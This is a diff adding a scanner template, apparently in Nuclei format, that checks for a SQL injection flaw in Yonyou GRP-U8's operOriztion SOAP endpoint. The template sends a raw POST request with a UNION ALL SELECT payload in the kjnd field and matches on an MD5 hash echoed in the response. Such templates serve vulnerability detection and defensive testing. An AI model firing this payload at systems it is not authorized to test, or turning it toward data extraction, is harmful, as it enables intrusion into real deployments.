@@ -1,0 +1,42 @@
+id: poc-yaml-yongyou-grp-u8-operoriztion-sqli
+info:
+  name: 用友GRP-U8 operOriztion SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /services/operOriztion HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: ""
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+              <kjnd xsi:type="xsd:string">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}'))-- </kjnd>
+            </wsdd:getGsbmfaByKjnd>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</getGsbmfaByKjndReturn>"
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
